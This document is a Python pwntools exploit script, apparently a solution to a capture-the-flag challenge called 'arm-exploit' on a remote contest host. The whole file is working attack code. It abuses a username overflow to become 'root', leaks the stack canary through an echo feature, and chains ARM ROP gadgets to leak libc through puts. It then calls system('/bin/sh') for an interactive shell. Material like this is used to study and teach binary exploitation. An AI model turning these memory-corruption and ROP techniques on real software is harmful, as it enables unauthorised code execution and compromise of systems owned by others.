#!/usr/bin/python
from pwn import *
import sys

HOST = "armexploit.acebear.site"
PORT = 3001

POPR3PC = 0x000105dc
POPR45678SBSLPC = 0x1107c
MOVR0R7GOR3 = 0x1106c

def login(user,pw):
  r.sendline("2")
  r.sendlineafter("Username: ", user)
  r.sendlineafter("password: ", pw)
  r.recvuntil("Your choice: ")

def changename(name):
  r.sendline("4")
  r.sendafter("username: ", name)
  r.recvuntil("Your choice: ")

def enter_echo():
  r.sendline("3")
  r.recvuntil("$ ")

def send_echo(arg):
  r.send("echo %s" % arg)
  LEAK = r.recvline()
  r.recvuntil("$ ")
  return LEAK

def exploit(r):
  r.recvuntil("Your choice: ")

  login("guest", "abc")

  log.info("Get root")

  changename("A"*32)
  changename("root")

  log.info("Leak canary")

  enter_echo()
  LEAK = send_echo("A"*124)
  CANARY = u32("\x00" + LEAK[124:127])

  log.info("CANARY         : %s" % hex(CANARY))

  """
  POP3RPC         => pop {r3, pc}; 
  POPR45678SBSLPC => pop {r4, r5, r6, r7, r8, sb, sl, pc};
  MOVR0R7GOR3     => mov r0, r7; blx r3;
  """
  
  log.info("Stage 1 : Leaker ropchain")
  
  payload = "A"*123
  payload += p32(CANARY)
  payload += p32(0xdeadbeef)
    
  payload += p32(POPR3PC)
  payload += p32(e.plt["puts"])
  payload += p32(POPR45678SBSLPC)
  payload += p32(0) # R4
  payload += p32(0) # R5
  payload += p32(0) # R6
  payload += p32(e.got["puts"]) # R7
  payload += p32(0) # R8
  payload += p32(0) # SB
  payload += p32(0) # SL
  payload += p32(MOVR0R7GOR3)
  payload += "A"*(203-len(payload))
  payload += p32(0x00010CFC)        # back to rootecho
  
  send_echo(payload)
  
  r.sendline("exit")                # Trigger ropchain
  PUTS = u32(r.recv(4))
  libc.address = PUTS - libc.symbols["puts"]
  
  log.info("PUTS       : %s" % hex(PUTS))
  log.info("LIBC       : %s" % hex(libc.address))

  log.info("Stage 2 : Execute ropchain")
  
  payload = "A"*123
  payload += p32(CANARY)
  payload += p32(0xdeadbeef)
  
  payload += p32(POPR3PC)
  payload += p32(libc.symbols["system"])
  payload += p32(POPR45678SBSLPC)
  payload += p32(0) # R4
  payload += p32(0) # R5
  payload += p32(0) # R6
  payload += p32(next(libc.search("/bin/sh")))  # R7
  payload += p32(0) # R8
  payload += p32(0) # SB
  payload += p32(0) # SL
  payload += p32(MOVR0R7GOR3)
  payload += "A"*(203-len(payload))
  
  send_echo(payload)
  
  r.sendline("exit")        # Trigger ropchain

  r.interactive()
  
  return

if __name__ == "__main__":
  e = ELF("./arm-exploit")
  libc = ELF("./libc-2.19.so")

  if len(sys.argv) > 1:
    r = remote(HOST, PORT)
    exploit(r)
  else:
    r = process("./arm-exploit")
    print util.proc.pidof(r)
    pause()
    exploit(r)